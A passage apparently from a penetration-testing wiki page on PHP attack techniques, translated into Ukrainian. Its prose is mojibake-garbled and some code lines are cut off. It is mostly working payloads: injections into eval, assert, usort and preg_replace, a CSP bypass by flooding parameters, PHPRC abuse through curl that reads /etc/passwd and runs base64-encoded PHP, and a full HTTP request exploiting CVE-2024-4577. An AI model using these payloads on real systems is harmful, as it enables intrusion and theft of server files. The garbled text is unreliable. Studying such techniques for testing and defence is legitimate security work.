* –ö–æ–ª–∏ —É –≤–∞—Å —î **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –º–∞—à–∏–Ω–∏. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∞–¥—Ä–µ—Å—É: **/\~\<USERNAME>**, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —á–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω—ñ php –∫–∞—Ç–∞–ª–æ–≥–∏.
* [**LFI —Ç–∞ RCE –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é php –æ–±–≥–æ—Ä—Ç–æ–∫**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

–¶—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ PHP –¥–ª—è **–≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ö–µ—à—ñ–≤ –∑ –ø–∞—Ä–æ–ª—ñ–≤** —Ç–∞ –¥–ª—è **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏**, —á–∏ —î –ø–∞—Ä–æ–ª—å –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º —É –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—ñ –∑ —Ö–µ—à–µ–º.\
–ü—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –∞–ª–≥–æ—Ä–∏—Ç–º–∏: `PASSWORD_DEFAULT` —Ç–∞ `PASSWORD_BCRYPT` (–ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `$2y$`). –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **PASSWORD\_DEFAULT —á–∞—Å—Ç–æ —î —Ç–∏–º –∂–µ, —â–æ —ñ PASSWORD\_BCRYPT.** –Ü –Ω–∞—Ä–∞–∑—ñ **PASSWORD\_BCRYPT** –º–∞—î **–æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ —Ä–æ–∑–º—ñ—Ä –≤—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö —É 72 –±–∞–π—Ç–∏**. –¢–æ–º—É, –∫–æ–ª–∏ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ö–µ—à –¥–ª—è —á–æ–≥–æ—Å—å –±—ñ–ª—å—à–æ–≥–æ –∑–∞ 72 –±–∞–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—å–æ–≥–æ –∞–ª–≥–æ—Ä–∏—Ç–º—É, –±—É–¥—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –ª–∏—à–µ –ø–µ—Ä—à—ñ 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP –∑–∞–≥–æ–ª–æ–≤–∫–∏ –æ–±—Ö—ñ–¥ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –ø–æ–º–∏–ª–∫–∞–º–∏ PHP

#### –í–∏–∫–ª–∏–∫ –ø–æ–º–∏–ª–∫–∏ –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤

–ó [**—Ü—å–æ–≥–æ —Ç—Ä–µ–¥—É –≤ —Ç–≤—ñ—Ç—Ç–µ—Ä—ñ**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –±—ñ–ª—å—à–µ –Ω—ñ–∂ 1000 GET –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –∞–±–æ 1000 POST –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ –∞–±–æ 20 —Ñ–∞–π–ª—ñ–≤, PHP –Ω–µ –±—É–¥–µ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –æ–±—ñ–π—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–≥–æ–ª–æ–≤–∫–∏ CSP, —è–∫—ñ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—Ç—å—Å—è –≤ –∫–æ–¥–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### –ó–∞–ø–æ–≤–Ω–µ–Ω–Ω—è —Ç—ñ–ª–∞ –ø–µ—Ä–µ–¥ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è–º –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤

–Ø–∫—â–æ **PHP-—Å—Ç–æ—Ä—ñ–Ω–∫–∞ –≤–∏–≤–æ–¥–∏—Ç—å –ø–æ–º–∏–ª–∫–∏ —Ç–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –¥–µ—è–∫—ñ –¥–∞–Ω—ñ, –Ω–∞–¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º**, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ PHP-—Å–µ—Ä–≤–µ—Ä –≤–∏–≤–µ—Å—Ç–∏ –¥–µ—è–∫–∏–π **–∫–æ–Ω—Ç–µ–Ω—Ç –¥–æ—Å—Ç–∞—Ç–Ω—å–æ—ó –¥–æ–≤–∂–∏–Ω–∏**, —Ç–∞–∫ —â–æ –∫–æ–ª–∏ –≤—ñ–Ω –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è **–¥–æ–¥–∞—Ç–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∏** –¥–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —Å–µ—Ä–≤–µ—Ä –≤–∏–¥–∞—Å—Ç—å –ø–æ–º–∏–ª–∫—É.\
–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—É—Å–∏–≤ —Å–µ—Ä–≤–µ—Ä –≤–∏–¥–∞—Ç–∏ –≤–µ–ª–∏–∫—ñ –ø–æ–º–∏–ª–∫–∏**, —ñ, —è–∫ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –Ω–∞ –µ–∫—Ä–∞–Ω—ñ, –∫–æ–ª–∏ PHP –Ω–∞–º–∞–≥–∞–≤—Å—è **–∑–º—ñ–Ω–∏—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∑–∞–≥–æ–ª–æ–≤–∫–∞, –≤—ñ–Ω –Ω–µ –∑–º—ñ–≥** (—Ç–æ–º—É, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–≥–æ–ª–æ–≤–æ–∫ CSP –Ω–µ –±—É–≤ –Ω–∞–¥—ñ—Å–ª–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É):

![](<../../../.gitbook/assets/image (1085).png>)

## SSRF —É —Ñ—É–Ω–∫—Ü—ñ—è—Ö PHP

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## –í–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ –¥–ª—è –±—ñ–ª—å—à –∫–æ—Ä–∏—Å–Ω–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **RCE —á–µ—Ä–µ–∑** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ —É –∞—Ä–≥—É–º–µ–Ω—Ç—ñ "replace", –ø–æ—Ç—Ä—ñ–±–Ω–µ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –æ–¥–Ω–µ —Å–ø—ñ–≤–ø–∞–¥—ñ–Ω–Ω—è.\
–¶—è –æ–ø—Ü—ñ—è preg\_replace –±—É–ª–∞ **–∑–∞—Å—Ç–∞—Ä—ñ–ª–∞ –∑ PHP 5.5.0.**

### **RCE —á–µ—Ä–µ–∑ Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE —á–µ—Ä–µ–∑ Assert()**

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤ php –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–¥, –Ω–∞–ø–∏—Å–∞–Ω–∏–π —É —Ä—è–¥–∫—É**, —â–æ–± **–ø–æ–≤–µ—Ä–Ω—É—Ç–∏ true –∞–±–æ false** (—ñ –≤ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤—ñ–¥ —Ü—å–æ–≥–æ –∑–º—ñ–Ω–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è). –ó–∞–∑–≤–∏—á–∞–π –∑–º—ñ–Ω–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –±—É–¥–µ –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –≤ —Å–µ—Ä–µ–¥–∏–Ω—É —Ä—è–¥–∫–∞. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:\
`assert("strpos($_GET['page']),'..') === false")` --> –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE**, –≤–∏ –º–æ–≥–ª–∏ –± –∑—Ä–æ–±–∏—Ç–∏:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
–í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ **–∑–ª–∞–º–∞—Ç–∏** —Å–∏–Ω—Ç–∞–∫—Å–∏—Å **–∫–æ–¥—É**, **–¥–æ–¥–∞—Ç–∏** –≤–∞—à **payload**, –∞ –ø–æ—Ç—ñ–º **–≤–∏–ø—Ä–∞–≤–∏—Ç–∏ –π–æ–≥–æ –∑–Ω–æ–≤—É**. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–ª–æ–≥—ñ—á–Ω—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó** —Ç–∞–∫—ñ —è–∫ "**and" –∞–±–æ "%26%26" –∞–±–æ "|"**. –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ "or", "||" –Ω–µ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏ —è–∫—â–æ –ø–µ—Ä—à–∞ —É–º–æ–≤–∞ —ñ—Å—Ç–∏–Ω–Ω–∞, –Ω–∞—à payload –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ. –¢–∞–∫ —Å–∞–º–æ ";" –Ω–µ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏ –Ω–∞—à payload –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ.

**–Ü–Ω—à–∞ –æ–ø—Ü—ñ—è** - –¥–æ–¥–∞—Ç–∏ –¥–æ —Ä—è–¥–∫–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∏: `'.highlight_file('.passwd').'`

**–Ü–Ω—à–∞ –æ–ø—Ü—ñ—è** (—è–∫—â–æ —É –≤–∞—Å —î –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π –∫–æ–¥) - –∑–º—ñ–Ω–∏—Ç–∏ –¥–µ—è–∫—É –∑–º—ñ–Ω–Ω—É, —â–æ–± –∑–º—ñ–Ω–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è: `$file = "hola"`

### **RCE —á–µ—Ä–µ–∑ usort()**

–¶—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å–æ—Ä—Ç—É–≤–∞–Ω–Ω—è –º–∞—Å–∏–≤—É –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó —Ñ—É–Ω–∫—Ü—ñ—ó.\
–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é —Ñ—É–Ω–∫—Ü—ñ—î—é:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **//** –¥–ª—è –∫–æ–º–µ–Ω—Ç—É–≤–∞–Ω–Ω—è —Ä–µ—à—Ç–∏ –∫–æ–¥—É.

–©–æ–± –≤–∏—è–≤–∏—Ç–∏ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥—É–∂–æ–∫, —è–∫—ñ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–∞–∫—Ä–∏—Ç–∏:

* `?order=id;}//`: –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É (`Parse error: syntax error, unexpected ';'`). –ú–æ–∂–ª–∏–≤–æ, –Ω–∞–º –Ω–µ –≤–∏—Å—Ç–∞—á–∞—î –æ–¥–Ω—ñ—î—ó –∞–±–æ –∫—ñ–ª—å–∫–æ—Ö –¥—É–∂–æ–∫.
* `?order=id);}//`: –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ **–ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è**. –¶–µ, –∑–¥–∞—î—Ç—å—Å—è, –ø—Ä–∞–≤–∏–ª—å–Ω–æ.
* `?order=id));}//`: –º–∏ –æ—Ç—Ä–∏–º—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É (`Parse error: syntax error, unexpected ')' i`). –ú–æ–∂–ª–∏–≤–æ, —É –Ω–∞—Å –∑–∞–Ω–∞–¥—Ç–æ –±–∞–≥–∞—Ç–æ –∑–∞–∫—Ä–∏–≤–∞—é—á–∏—Ö –¥—É–∂–æ–∫.

### **RCE —á–µ—Ä–µ–∑ .httaccess**

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** **.htaccess**, —Ç–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π —ñ –Ω–∞–≤—ñ—Ç—å –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ (–Ω–∞–ª–∞—à—Ç—É–≤–∞–≤—à–∏, —â–æ–± —Ñ–∞–π–ª–∏ –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º .htaccess –º–æ–≥–ª–∏ –±—É—Ç–∏ **–≤–∏–∫–æ–Ω–∞–Ω—ñ**).

–†—ñ–∑–Ω—ñ –æ–±–æ–ª–æ–Ω–∫–∏ .htaccess –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://github.com/wireghoul/htshells)

### RCE —á–µ—Ä–µ–∑ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –≤ PHP** (—ñ —â–µ –æ–¥–Ω—É –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —Ö–æ—á–∞ –∑ –±—ñ–ª—å—à–æ—é –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è–º, –º–æ–∂–ª–∏–≤–æ, —Ü–µ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏), –≤–∏ –º–æ–≥–ª–∏ –± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): –¶—è –∑–º—ñ–Ω–Ω–∞ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —ñ–Ω—à–∏—Ö –±—ñ–Ω–∞—Ä–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ (—Ö–æ—á–∞ –≤ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É —Ü–µ –º–æ–∂–µ –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞—Ç–∏).
* **`PHPRC`** : –Ü–Ω—Å—Ç—Ä—É–∫—Ç—É—î PHP –ø—Ä–æ **–¥–µ –∑–Ω–∞–π—Ç–∏ —Å–≤—ñ–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª**, –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è `php.ini`. –Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–≤—ñ–π –≤–ª–∞—Å–Ω–∏–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª, —Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `PHPRC`, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ PHP –Ω–∞ –Ω—å–æ–≥–æ. –î–æ–¥–∞–π—Ç–µ –∑–∞–ø–∏—Å **`auto_prepend_file`**, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –¥—Ä—É–≥–∏–π –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π —Ñ–∞–π–ª. –¶–µ–π –¥—Ä—É–≥–∏–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å –∑–≤–∏—á–∞–π–Ω–∏–π **PHP –∫–æ–¥, —è–∫–∏–π –ø–æ—Ç—ñ–º –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è** PHP-—ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä–æ–º –ø–µ—Ä–µ–¥ –±—É–¥—å-—è–∫–∏–º —ñ–Ω—à–∏–º –∫–æ–¥–æ–º.
1. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ PHP —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å –Ω–∞—à shellcode
2. –ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –¥—Ä—É–≥–∏–π —Ñ–∞–π–ª, —â–æ –º—ñ—Å—Ç–∏—Ç—å –¥–∏—Ä–µ–∫—Ç–∏–≤—É **`auto_prepend_file`**, —ñ–Ω—Å—Ç—Ä—É–∫—Ç—É—é—á–∏ PHP-–ø—Ä–µ–ø—Ä–æ—Ü–µ—Å–æ—Ä –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ñ–∞–π–ª, —è–∫–∏–π –º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–∏ –Ω–∞ –µ—Ç–∞–ø—ñ 1
3. –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –∑–º—ñ–Ω–Ω—É `PHPRC` –Ω–∞ —Ñ–∞–π–ª, —è–∫–∏–π –º–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–ª–∏ –Ω–∞ –µ—Ç–∞–ø—ñ 2.
* –û—Ç—Ä–∏–º–∞–π—Ç–µ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü–µ–π –ª–∞–Ω—Ü—é–≥ [**–∑ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –∑–≤—ñ—Ç—É**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - —â–µ –æ–¥–∏–Ω –≤–∞—Ä—ñ–∞–Ω—Ç
* –Ø–∫—â–æ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤ FreeBSD "—Ñ–∞–π–ª" `/dev/fd/0`, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å **`stdin`**, –±—É–¥—É—á–∏ **—Ç—ñ–ª–æ–º** –∑–∞–ø–∏—Ç—É, –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ–≥–æ –¥–æ `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* –ê–±–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE, —É–≤—ñ–º–∫–Ω—ñ—Ç—å **`allow_url_include`** —ñ –¥–æ–¥–∞–π—Ç–µ —Ñ–∞–π–ª –∑ **base64 PHP –∫–æ–¥–æ–º**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* –¢–µ—Ö–Ω—ñ–∫–∞ [**–∑ —Ü—å–æ–≥–æ –∑–≤—ñ—Ç—É**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

–í–µ–±-—Å–µ—Ä–≤–µ—Ä –∞–Ω–∞–ª—ñ–∑—É—î HTTP –∑–∞–ø–∏—Ç–∏ —ñ –ø–µ—Ä–µ–¥–∞—î —ó—Ö PHP —Å–∫—Ä–∏–ø—Ç—É, –≤–∏–∫–æ–Ω—É—é—á–∏ –∑–∞–ø–∏—Ç, —Ç–∞–∫–∏–π —è–∫ [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) —è–∫ `php.exe cgi.php foo=bar`, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ñ–Ω'—î–∫—Ü—ñ—é –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤. –¶–µ –¥–æ–∑–≤–æ–ª–∏—Ç—å —ñ–Ω'—î–∫—Ç—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è PHP –∫–æ–¥—É –∑ —Ç—ñ–ª–∞:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –º–æ–∂–ª–∏–≤–æ –≤–≤–µ—Å—Ç–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä "-" –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∏–º–≤–æ–ª—É 0xAD —á–µ—Ä–µ–∑ –ø–æ–¥–∞–ª—å—à—É –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—é PHP. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –ø—Ä–∏–∫–ª–∞–¥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∑ [**—Ü—å–æ–≥–æ –ø–æ—Å—Ç—É**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**–£ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://blog.redteam-pentesting.de/2024/moodle-rce/) –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —á—É–¥–æ–≤—ñ —ñ–¥–µ—ó –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó brain fuck PHP –∫–æ–¥—É –∑ –¥—É–∂–µ –æ–±–º–µ–∂–µ–Ω–æ—é –∫—ñ–ª—å–∫—ñ—Å—Ç—é –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö —Å–∏–º–≤–æ–ª—ñ–≤.\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —Ç–∞–∫–æ–∂ –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è —Ü—ñ–∫–∞–≤–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π, —è–∫—ñ –¥–æ–∑–≤–æ–ª–∏–ª–∏ —ó–º –æ–±—ñ–π—Ç–∏ –∫—ñ–ª—å–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP –°—Ç–∞—Ç–∏—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑

–ü–æ–¥–∏–≤—ñ—Ç—å—Å—è, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –≤—Å—Ç–∞–≤–∏—Ç–∏ –∫–æ–¥ —É –≤–∏–∫–ª–∏–∫–∏ —Ü–∏—Ö —Ñ—É–Ω–∫—Ü—ñ–π (–∑ [—Ç—É—Ç](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
–Ø–∫—â–æ –≤–∏ –Ω–∞–ª–∞–≥–æ–¥–∂—É—î—Ç–µ PHP-–¥–æ–¥–∞—Ç–æ–∫, –≤–∏ –º–æ–∂–µ—Ç–µ –≥–ª–æ–±–∞–ª—å–Ω–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ –¥—Ä—É–∫ –ø–æ–º–∏–ª–æ–∫ —É `/etc/php5/apache2/php.ini`, –¥–æ–¥–∞–≤—à–∏ `display_errors = On`, —ñ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ apache: `sudo systemctl restart apache2`

### –î–µ–æ–±—Ñ—É—Å–∫–∞—Ü—ñ—è PHP-–∫–æ–¥—É

